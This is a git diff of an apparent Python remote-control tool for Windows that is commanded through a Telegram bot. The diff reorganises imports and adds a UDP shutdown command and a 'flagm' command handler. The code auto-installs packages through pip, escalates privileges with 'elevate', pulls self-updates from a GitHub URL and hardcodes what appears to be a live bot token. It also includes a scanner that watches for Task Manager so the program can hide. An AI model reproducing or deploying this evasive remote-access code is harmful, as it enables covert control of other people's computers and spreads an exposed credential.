@@ -1,61 +1,17 @@
-
-
 import subprocess
 import pkg_resources
 import sys
-
-
-
-
-
-
-
-#import all required modules here
-#so that no errors are thrown because of unavailable modules
-
-
-
-required={"python-telegram-bot","psutil","datetime","messages","urllib3","regex","psutil","datetime","pyautogui","elevate"}
-installed={pkg.key for pkg in pkg_resources.working_set}
-missing=required-installed
-if missing:
-    subprocess.check_call([sys.executable,"-m","pip","install",*missing])
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-import urllib3 
-import regex
-import subprocess
-import logging
-import sys
-import subprocess
-import pkg_resources
-import psutil
-import datetime
-from messages import TelegramBot
-import os
-from tkinter import messagebox
-import pyautogui
-from subprocess import call
-from telegram import ForceReply, Update
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
-from elevate import elevate
-from multiprocessing import Process
-import time
 from os.path import expanduser
 import os.path
+import time
+
+
+
+
+#version 
+__version__=1.09
+
+#contants:
 
 file=sys.argv[0] 
 #Token for the telegram bot.
@@ -64,51 +20,24 @@ token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
 url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/development_file.py"
 #delay value(int) for process scanner
 delay=0.1
+#path for logging and screenshot modules
 dir_pathV= expanduser("~")+"\\"
 
 
 
+SERVER_IP   = '172.16.3.6'
+PORT_NUMBER = 5000
+SIZE = 1024
 
-#version 
-__version__=1.09
 
-
-
-#scanner class for scanning and keeping track of currently running programs.
-class process_scanner:
-    
-
-    def __init__(self,_obj_name,_hidev=False) -> True:
-        self._obj_name=_obj_name
-        self._hidev=_hidev
-
-    def start_scan(self,_interval):
-        self._interval=_interval
-
-        while self._hidev==False:
-            import time
-            time.sleep(self._interval)
-            import subprocess
-            processes=subprocess.check_output("tasklist")
-            if "Taskmgr.exe" in str(processes):
-
-                self._hidev=True
-
-        if self._hidev==True:
-            return False
-        
-    def scan_stop(self):
-        self._hidev=False
-
-    def show_hide_value(self):
-        return self._hidev,__name__
- 
 
 #Logger class for logging events. Events have 3 severity:info, warning and critical
 #info: call with this to record events that are part of the normal functioning of the program
 #warning: call with this severity to record events that are crucial but will not break the funtioning of the program.
 #critical: call with this severity to record events that are critical to the functioning of the program.
 
+
+    
 class logger:
 
 
@@ -161,13 +90,15 @@ class logger:
 
 
 
-    
 
 
+
+#import all required modules here
+#so that no errors are thrown because of unavailable modules
 
 
 logins=logger("logfile.txt",0,dir_pathV,"globallogger")
-
+logins.info("...","BASE MODULES INITIATED")
 
 #installs crucial modules by calling pip. Note: programmatic use of pip is strictly not allowed.
 try:
@@ -182,6 +113,83 @@ except:
     logins.critical("PACKAGE INSTALLER","PACKAGES NOT INITIALIZED")
     logins.critical("PACKAGE INSTALLER","THE FOLLOWING PACKAGES WERE NOT INSTALLED:   "+str(missing))
     
+
+
+
+
+
+
+
+
+#import all recently installed modules.
+
+
+
+
+
+
+import urllib3 
+import regex
+import subprocess
+import logging
+import sys
+import subprocess
+import pkg_resources
+import psutil
+import datetime
+from messages import TelegramBot
+import os
+from tkinter import messagebox
+import pyautogui
+from subprocess import call
+from telegram import ForceReply, Update
+from telegram.ext import Application, CommandHandler, ConversationHandler, ContextTypes, MessageHandler, filters
+from elevate import elevate
+from multiprocessing import Process
+import time
+from socket import socket, AF_INET, SOCK_DGRAM
+
+
+
+
+
+
+
+#scanner class for scanning and keeping track of currently running programs.
+class process_scanner:
+    
+
+    def __init__(self,_obj_name,_hidev=False) -> True:
+        self._obj_name=_obj_name
+        self._hidev=_hidev
+
+    def start_scan(self,_interval):
+        self._interval=_interval
+
+        while self._hidev==False:
+            import time
+            time.sleep(self._interval)
+            import subprocess
+            processes=subprocess.check_output("tasklist")
+            if "Taskmgr.exe" in str(processes):
+
+                self._hidev=True
+
+        if self._hidev==True:
+            return False
+        
+    def scan_stop(self):
+        self._hidev=False
+
+    def show_hide_value(self):
+        return self._hidev,__name__
+ 
+
+
+
+
+
+
 
 
 
@@ -414,7 +422,40 @@ else:
             logins.info("LOGFILE ACCESS","LOGFILE CLEARED")
         except:
             logins.warning("LOGFILE ACCESS","LOGFILE COULD NOT BE CLEARED")
-            
+
+
+
+    """developmental command line mode function. Do not use on live system"""        
+    async def flagm(update: Update, context: ContextTypes.DEFAULT_TYPE):
+            message=update.effective_message.text
+            ttmsg=message.replace("/command","")
+            print (ttmsg)
+
+
+    #developmental function still in beta phase.
+    """This function is still in development. Use with caution."""
+    async def shut_all_system(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+        try:
+
+
+
+
+            logins.info("SHUT_ALL_SYSTEMS","FUNCTION INITIATED")
+
+            mySocket = socket( AF_INET, SOCK_DGRAM )
+
+            link_message = "link_shutdown"
+
+            mySocket.sendto(link_message.encode('utf-8'),(SERVER_IP,PORT_NUMBER))
+
+            sys.exit()
+            logins.info("SHUT_ALL_SYSTEMS","ALL SYSTEMS SHUTTING DOWN")
+        except:
+            logins.warning("SHUT_ALL_SYSTEMS","FUNCTION NON RESPONSIVE")
+
+
+    
+
 
 
 
@@ -462,7 +503,7 @@ else:
         application.add_handler(CommandHandler("getlogfile",get_log_file))#type /getlogfile
         application.add_handler(CommandHandler("clearlogfile",clear_log_file)) #type /clearlogfile
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, show_message))
-
+        application.add_handler(CommandHandler("flagm",flagm))
 
         # Run the bot until the user presses Ctrl-C
         try:
